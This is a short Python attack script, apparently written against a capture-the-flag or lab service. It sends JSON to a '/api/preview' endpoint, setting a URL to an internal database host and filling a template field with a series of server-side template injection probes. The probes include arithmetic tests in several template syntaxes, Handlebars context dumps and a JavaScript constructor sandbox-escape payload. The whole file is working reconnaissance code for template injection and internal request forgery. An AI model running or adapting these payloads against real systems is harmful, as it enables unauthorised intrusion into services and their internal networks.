import urllib.request, urllib.error, json
BASE='https://<host>/fireburned-2'
def post(path,obj):
    data=json.dumps(obj).encode()
    r=urllib.request.Request(BASE+path,data=data,headers={'Content-Type':'application/json','User-Agent':'Mozilla/5.0'},method='POST')
    try:
        resp=urllib.request.urlopen(r,timeout=20); body=resp.read(); code=resp.status
    except urllib.error.HTTPError as e:
        body=e.read(); code=e.code
    except Exception as e:
        return 'ERR '+str(e)
    return '%s %s'%(code,body[:1500].decode('latin1','replace'))
def doc(t, extra=None):
    d={'url':'http://fireburned--db:8080/health','fields':{'template':{'stringValue':t}}}
    if extra: d.update(extra)
    return d
cases=[
 doc('HELLO'),
 doc('{{7*7}}'),
 doc('<%= 7*7 %>'),
 doc('${7*7}'),
 doc('#{7*7}'),
 doc('{{this}}'),
 doc('{{#each this}}{{@key}}={{this}};{{/each}}'),
 doc('Hello {{name}}'),
 doc('{{constructor.constructor("return 7*7")()}}'),
 doc('{{#with "s" as |string|}}{{string}}{{/with}}'),
]
for c in cases:
    print('===',json.dumps(c)[:200])
    print(post('/api/preview',c))
